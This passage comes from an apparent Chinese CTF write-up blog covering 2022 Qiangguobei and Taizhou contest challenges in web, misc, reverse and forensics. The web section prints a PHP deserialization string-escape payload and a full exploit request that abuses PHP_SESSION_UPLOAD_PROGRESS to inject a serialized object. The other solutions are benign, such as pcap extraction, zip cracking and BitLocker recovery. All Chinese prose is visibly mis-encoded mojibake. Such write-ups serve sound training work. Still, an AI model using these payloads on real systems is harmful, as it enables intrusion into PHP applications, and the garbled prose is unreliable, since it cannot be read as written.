class="hljs-variable">$password</span>=<span class="hljs-number">123456</span>;<br><span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));<br><span class="hljs-variable">$test</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure>

<p><code>?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;&#125;</code></p>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">admin</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$root</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;root;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;3123123123123\n&quot;</span>;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;root ===<span class="hljs-string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123412341234&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;aaaaaaaa&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/flag.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>host:port<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>369<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary7Pufxj5tsIY9p2yA<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=n480589952d85l2vvkeb01sh9g<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">123</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;|O:5:\&quot;<span class="hljs-keyword">admin</span>\&quot;:1:&#123;s:4:\&quot;root\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7Pufxj5tsIY9p2yA--</span></span><br></code></pre></td></tr></table></figure>


<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ä¸è¦è¢«è¿·æƒ‘"><a href="#ä¸è¦è¢«è¿·æƒ‘" class="headerlink" title="ä¸è¦è¢«è¿·æƒ‘"></a>ä¸è¦è¢«è¿·æƒ‘</h2><p>ç­›é€‰<code>http</code>åè®®çš„åŒ…ï¼Œæ‰¾åˆ°<code>flag.zip</code></p>
<p><img src="/img/wp/2022/2022qgb-east-2.png"></p>
<p>å¯¼å‡ºå‹ç¼©åŒ…åçˆ†ç ´å¯†ç ï¼Œå¾—åˆ°<code>123321</code></p>
<p>å¾—åˆ°ä¸€ä¸²jjencodeç¼–ç å­—ç¬¦</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">$=~[];$=&#123;<span class="hljs-attr">___</span>:++$,<span class="hljs-attr">$$$$</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">__$</span>:++$,<span class="hljs-attr">$_$_</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">_$_</span>:++$,<span class="hljs-attr">$_$$</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$$_$</span>:($[$]+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">_$$</span>:++$,<span class="hljs-attr">$$$_</span>:(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$__</span>:++$,<span class="hljs-attr">$_$</span>:++$,<span class="hljs-attr">$$__</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[$],<span class="hljs-attr">$$_</span>:++$,<span class="hljs-attr">$$$</span>:++$,<span class="hljs-attr">$___</span>:++$,<span class="hljs-attr">$__$</span>:++$&#125;;$.$_=($.$_=$+<span class="hljs-string">&quot;&quot;</span>)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+<span class="hljs-string">&quot;&quot;</span>)[$.__$])+((!$)+<span class="hljs-string">&quot;&quot;</span>)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$.__$])+($._=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+<span class="hljs-string">&quot;\&quot;&quot;</span>+$.$$$$+(![]+<span class="hljs-string">&quot;&quot;</span>)[$._$_]+$.$_$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$__+$.$$$+<span class="hljs-string">&quot;&#123;\\&quot;</span>+$.__$+$._$_+$.$$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.$_$+$._+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$._$_+$.$$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.___+(![]+<span class="hljs-string">&quot;&quot;</span>)[$._$_]+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$_$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$$+$.__$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.__$+$.$$_$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$.$__+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$._$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$$+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$_+$._$_+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$$+$.__$+$.__+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$_$+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.$$_+$.$$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.__$+$._$$+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$._$$+$.___+<span class="hljs-string">&quot;\\&quot;</span>+$.__$+$.___+$.$__+$._$+<span class="hljs-string">&quot;&#125;&quot;</span>+<span class="hljs-string">&quot;\&quot;&quot;</span>)())();<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022qgb-east-3.png"></p>
<h2 id="PCAPæ–‡ä»¶åˆ†æ"><a href="#PCAPæ–‡ä»¶åˆ†æ" class="headerlink" title="PCAPæ–‡ä»¶åˆ†æ"></a>PCAPæ–‡ä»¶åˆ†æ</h2><p><code>flag.pcapng</code>æ‰¾åˆ°æ²¡ç”¨çš„<code>flag.zip</code></p>
<p><code>02.pcapng</code>æå–å‡ºä¸€ä¸ª<code>02.zip</code>ï¼Œä¸€ä¸ª<code>2.png</code></p>
<p><code>2.png</code>ä¸Šçœ‹åˆ°å‹ç¼©åŒ…å¯†ç <code>Vu8#fI9</code>ï¼Œè§£å‹å¾—åˆ°<code>flag2.png</code></p>
<p>ä¿®æ”¹<code>flag2.png</code>é«˜åº¦å¾—åˆ°flag</p>
<p><img src="/img/wp/2022/2022qgb-east-4.png"></p>
<h2 id="å¹³æ­£å¼€"><a href="#å¹³æ­£å¼€" class="headerlink" title="å¹³æ­£å¼€"></a>å¹³æ­£å¼€</h2><p><em>èµ›åå¤ç°</em></p>
<p>æ¯ä¸€ä½å–åååŠ ä¸€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i)==<span class="hljs-number">0</span>:<br>        f.write(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0xff</span>)+<span class="hljs-number">1</span>,<span class="hljs-built_in">ord</span>(i))<br>    f.write(<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0xff</span>)+<span class="hljs-number">1</span>))<br>f.close()<br></code></pre></td></tr></table></figure>

<p>ä¼ªåŠ å¯†åå¾—åˆ°ä¸€ä¸²<code>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚åŠ å¯†</code>å­—ç¬¦ä¸²ï¼Œè§£å¯†å¾—åˆ°flag</p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>å…ˆç”¨<code>pyinstxtractor</code>è§£åŒ…ï¼Œæ‰¾åˆ°<code>test_obfuscated.pyc</code>ï¼Œåç¼–è¯‘ï¼Œå¾—åˆ°æºä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pygame<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br>difficulty = <span class="hljs-number">25</span><br>frame_size_x = <span class="hljs-number">720</span><br>frame_size_y = <span class="hljs-number">480</span><br>check_errors = pygame.init()<br>pygame.display.set_caption(<span class="hljs-string">&#x27;Lets Play&#x27;</span>)<br>game_window = pygame.display.set_mode((frame_size_x, frame_size_y))<br>black = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>white = pygame.Color(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br>red = pygame.Color(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>green = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>)<br>blue = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>fps_controller = pygame.time.Clock()<br>snake_pos = [<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">50</span>]<br>snake_body = [<br>    [<br>        <span class="hljs-number">100</span>,<br>        <span class="hljs-number">50</span>],<br>    [<br>        <span class="hljs-number">90</span>,<br>        <span class="hljs-number">50</span>],<br>    [<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">50</span>]]<br>f_body = [<br>    [<br>        <span class="hljs-number">40</span>,<br>        <span class="hljs-number">29</span>],<br>    [<br>        <span class="hljs-number">40</span>,<br>        <span class="hljs-number">30</span>],<br>    ...<br>    ...<br>    ...<br>    [<br>        <span class="hljs-number">624</span>,<br>        <span class="hljs-number">38</span>]]<br>food_pos = [<br>    random.randrange(<span class="hljs-number">1</span>, frame_size_x // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>,<br>    random.randrange(<span class="hljs-number">1</span>, frame_size_y // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>]<br>food_spawn = <span class="hljs-literal">True</span><br>direction = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br>change_to = direction<br>score = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game_over</span>():<br>    OOOO000000O000OO0 = pygame.font.SysFont(<span class="hljs-string">&#x27;times new roman&#x27;</span>, <span class="hljs-number">90</span>)<br>    O000O0OO0OO0O0O0O = OOOO000000O000OO0.render(<span class="hljs-string">&#x27;YOU DIED&#x27;</span>, <span class="hljs-literal">True</span>, red)<br>    OOO00OO00O0O00O00 = O000O0OO0OO0O0O0O.get_rect()<br>    OOO00OO00O0O00O00.midtop = (frame_size_x / <span class="hljs-number">2</span>, frame_size_y / <span class="hljs-number">4</span>)<br>    game_window.fill(black)<br>    game_window.blit(O000O0OO0OO0O0O0O, OOO00OO00O0O00O00)<br>    show_score(<span class="hljs-number">0</span>, red, <span class="hljs-string">&#x27;times&#x27;</span>, <span class="hljs-number">20</span>)<br>    pygame.display.flip()<br>    time.sleep(<span class="hljs-number">3</span>)<br>    pygame.quit()<br>    sys.exit()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_score</span>(<span class="hljs-params">OO00000O0O000OO0O, O0O0O0OOOO000O000, O0O0000O00OO00OO0, O0O000OOOOOO00O0O</span>):<br>    O00O000000OO0O0OO = pygame.font.SysFont(O0O0000O00OO00OO0, O0O000OOOOOO00O0O)<br>    O0O0O0O0O0O00O00O = O00O000000OO0O0OO.render(<span class="hljs-string">&#x27;Score : &#x27;</span> + <span class="hljs-built_in">str</span>(score), <span class="hljs-literal">True</span>, O0O0O0OOOO000O000)<br>    O000O0OOOO000OO0O = O0O0O0O0O0O00O00O.get_rect()<br>    <span class="hljs-keyword">if</span> OO00000O0O000OO0O == <span class="hljs-number">1</span>:<br>        O000O0OOOO000OO0O.midtop = (frame_size_x / <span class="hljs-number">10</span>, <span class="hljs-number">15</span>)<br>    <span class="hljs-keyword">else</span>:<br>        O000O0OOOO000OO0O.midtop = (frame_size_x / <span class="hljs-number">2</span>, frame_size_y / <span class="hljs-number">1.25</span>)<br>    game_window.blit(O0O0O0O0O0O00O00O, O000O0OOOO000OO0O)<br><br><span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>    <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>        pygame.quit()<br>        sys.exit()<br>    <span class="hljs-keyword">elif</span> event.<span class="hljs-built_in">type</span> == pygame.KEYDOWN:<br>        <span class="hljs-keyword">if</span> event.key == pygame.K_UP <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;w&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;UP&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_DOWN <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;s&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;DOWN&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_LEFT <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;LEFT&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_RIGHT <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;d&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_ESCAPE:<br>            pygame.event.post(pygame.event.Event(pygame.QUIT))<br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;UP&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;DOWN&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;UP&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;DOWN&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;UP&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;DOWN&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;LEFT&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;RIGHT&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;LEFT&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;RIGHT&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;LEFT&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;UP&#x27;</span>:<br>    snake_pos[<span class="hljs-number">1</span>] -= <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;DOWN&#x27;</span>:<br>    snake_pos[<span class="hljs-number">1</span>] += <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;LEFT&#x27;</span>:<br>    snake_pos[<span class="hljs-number">0</span>] -= <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;RIGHT&#x27;</span>:<br>    snake_pos[<span class="hljs-number">0</span>] += <span class="hljs-number">10</span><br>snake_body.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">list</span>(snake_pos))<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] == food_pos[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> snake_pos[<span class="hljs-number">1</span>] == food_pos[<span class="hljs-number">1</span>]:<br>    score += <span class="hljs-number">1</span><br>    food_spawn = <span class="hljs-literal">False</span><br><span class="hljs-keyword">else</span>:<br>    snake_body.pop()<br><span class="hljs-keyword">if</span> score == <span class="hljs-number">1000</span>:<br>    game_window.fill(black)<br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> f_body:<br>        pygame.draw.rect(game_window, green, pygame.Rect(pos[<span class="hljs-number">0</span>], pos[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>    pygame.display.flip()<br>    time.sleep(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> food_spawn:<br>    food_pos = [<br>        random.randrange(<span class="hljs-number">1</span>, frame_size_x // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>,<br>        random.randrange(<span class="hljs-number">1</span>, frame_size_y // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>]<br>food_spawn = <span class="hljs-literal">True</span><br>game_window.fill(black)<br><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> snake_body:<br>    pygame.draw.rect(game_window, green, pygame.Rect(pos[<span class="hljs-number">0</span>], pos[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>, <span class="hljs-number">10</span>))<br>pygame.draw.rect(game_window, white, pygame.Rect(food_pos[<span class="hljs-number">0</span>], food_pos[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>, <span class="hljs-number">10</span>))<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> snake_pos[<span class="hljs-number">0</span>] &gt; frame_size_x - <span class="hljs-number">10</span>:<br>    game_over()<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> snake_pos[<span class="hljs-number">1</span>] &gt; frame_size_y - <span class="hljs-number">10</span>:<br>    game_over()<br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> snake_body[<span class="hljs-number">1</span>:]:<br>    <span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] == block[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> snake_pos[<span class="hljs-number">1</span>] == block[<span class="hljs-number">1</span>]:<br>        game_over()<br>show_score(<span class="hljs-number">1</span>, white, <span class="hljs-string">&#x27;consolas&#x27;</span>, <span class="hljs-number">20</span>)<br>pygame.display.update()<br>fps_controller.tick(difficulty)<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>


<p>é€šè¿‡<code>f_body</code>å˜é‡ä¸­å‚¨å­˜çš„åæ ‡ç”»å›¾å¾—åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.new(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-number">1000</span>,<span class="hljs-number">1000</span>))<br>f_body=[...]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f_body:<br>    img.putpixel(<span class="hljs-built_in">tuple</span>(i),<span class="hljs-number">255</span>)<br>img.show()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022qgb-east-5.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022</tag>
        <tag>å¼ºå›½æ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022å°å·å¸‚ç¬¬äºŒå±Šç½‘ç»œå®‰å…¨å¤§èµ›wp</title>
    <url>/posts/b1b57dcc/</url>
    <content><![CDATA[<h1 id="åˆèµ›"><a href="#åˆèµ›" class="headerlink" title="åˆèµ›"></a>åˆèµ›</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="bitlocker"><a href="#bitlocker" class="headerlink" title="bitlocker"></a>bitlocker</h3><p>å†…å­˜å–è¯ï¼Œåœ¨å†…å­˜é•œåƒä¸­æœç´¢<code>txt</code>æ–‡ä»¶ï¼Œå¾—åˆ°<code>BitLocker</code>æ¢å¤å¯†é’¥</p>
<p><img src="/img/wp/2022/2022taizhou-1.png"></p>
<p>å¯¼å‡ºåå¾—åˆ°</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><code class="hljs txt">BitLocker é©±åŠ¨å™¨åŠ å¯†æ¢å¤å¯†é’¥<br><br>æ¢å¤å¯†é’¥ç”¨äºæ¢å¤ BitLocker ä¿æŠ¤çš„é©±åŠ¨å™¨ä¸Šçš„æ•°æ®ã€‚<br><br>è‹¥è¦éªŒè¯è¯¥å¯†ç æ˜¯å¦ä¸ºæ­£ç¡®çš„æ¢å¤å¯†ç ï¼Œè¯·å°†è¿™äº›æ ‡è®°ä¸æ¢å¤å±å¹•ä¸Šæ˜¾ç¤ºçš„æ ‡è®°è¿›è¡Œæ¯”è¾ƒã€‚<br><br>æ¢å¤å¯†é’¥æ ‡è®°: 118D5B0A-0C1F-4F<br>å®Œæ•´æ¢å¤å¯†é’¥æ ‡è®°: 118D5B0A-0C1F-4F76-A3B7-01658D566145<br><br>BitLocker æ¢å¤å¯†é’¥:<br>432696-262691-480018-407649-083578-365651-065142-713999<br></code></pre></td></tr></table></figure>

<p>åœ¨windows7è™šæ‹Ÿæœºä¸ŠæŒ‚è½½<code>bitlocker.vmdk</code>ï¼Œä½¿ç”¨æ¢å¤å¯†é’¥<code>432696-262691-480018-407649-083578-365651-065142-713999</code>è§£é”ï¼Œæ‹¿åˆ°<code>flag</code>æ–‡ä»¶</p>
<p>æ–‡ä»¶å¼€å¤´ä¸º<code>42 4d</code>ï¼Œåˆ¤æ–­æ˜¯bmpæ–‡ä»¶ï¼Œä½†æ˜¯æ–‡ä»¶å¤´è¢«ä¿®æ”¹äº†</p>
<p>åˆ æ‰æ–‡ä»¶å¤´å’Œæ–‡ä»¶å°¾ï¼Œæ–‡ä»¶é•¿åº¦é™¤ä»¥4åä¸º<code>39949</code>ï¼Œå› å¼åˆ†è§£å¾—åˆ°<code>7*13*439</code>ï¼Œæ‰€ä»¥å®½é«˜æ˜¯<code>439*91</code></p>
<p>ç”¨pythonç”Ÿæˆä¸€ä¸ªå®½ä¸º439ï¼Œé«˜ä¸º91çš„rgbaæ ¼å¼çš„bmpæ–‡ä»¶ï¼Œå’ŒåŸæ–‡ä»¶æ¯”è¾ƒï¼Œè¿˜åŸæ–‡ä»¶å¤´ï¼Œå¾—åˆ°flag</p>
<p><img src="/img/wp/2022/2022taizhou-2.png"></p>
<h3 id="çš‡å¸çš„flag"><a href="#çš‡å¸çš„flag" class="headerlink" title="çš‡å¸çš„flag"></a>çš‡å¸çš„flag</h3><p>crcæŠ¥é”™ï¼Œä¿®æ”¹é«˜åº¦ï¼Œå¾—åˆ°äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°<code>â€Œâ€Œâ€Œâ€Œâ€â€¬â€â€â€Œâ€Œâ€Œâ€Œâ€â€Œï»¿â€â€Œâ€Œâ€Œâ€Œâ€ï»¿â€Œâ€Œåªæœ‰èªæ˜çš„äººæ‰èƒ½å¾—åˆ°â€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œï»¿â€Œâ€Œâ€Œâ€Œâ€ï»¿â€Œâ€¬flagâ€Œâ€Œâ€Œâ€Œâ€Œï»¿â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€Œâ€¬â€Œâ€Œâ€Œâ€Œâ€â€ï»¿ï»¿å“¦â€Œâ€Œâ€Œâ€Œâ€ï»¿â€Œâ€Œâ€Œâ€Œâ€Œâ€Œâ€â€â€ï»¿â€Œâ€Œâ€Œâ€Œâ€â€Œâ€â€Œ</code></p>
<p>åœ¨010ä¸­çœ‹åˆ°å¾ˆå¤šä¸å¯è§å­—ç¬¦ï¼Œ0å®½å¾—åˆ°å¯†ç <code>eMp3r0R_pWD</code></p>
<p>stegsolveåˆ†æï¼Œå­˜åœ¨lsbéšå†™</p>
<p><img src="/img/wp/2022/2022taizhou-3.png"></p>
<h3 id="åˆ—æ–‡è™å…‹çš„ç§˜å¯†"><a href="#åˆ—æ–‡è™å…‹çš„ç§˜å¯†" class="headerlink" title="åˆ—æ–‡è™å…‹çš„ç§˜å¯†"></a>åˆ—æ–‡è™å…‹çš„ç§˜å¯†</h3><p>è¿™æ˜¯ä»€ä¹ˆé¢˜å‘€ï¼Œå¤ªç¦»è°±äº†ï¼Œåä½å¯†ç çˆ†ç ´ã€‚100åˆ†ç®€å•é¢˜åˆ°ç»“æŸæ‰ä¸‰è¡€</p>
<p><em>èµ›åå¤ç°</em></p>
<p>å…ˆä¿®å¤<code>zip</code>å¤´ï¼Œæ”¹æˆ<code>50 4B 03 04</code>ï¼Œç„¶åè¿›è¡Œåä½æ•°å­—çˆ†ç ´ï¼Œå¾—åˆ°<code>874375984</code></p>
<p>å›¾ç‰‡å°¾çœ‹åˆ°<code>oursecret</code>ç‰¹å¾å—ï¼Œå¯†ç æ˜¯å›¾ç‰‡ä¸Šçš„åˆ—æ–‡è™å…‹åå­—<code>LeEuw3nh0ek</code></p>
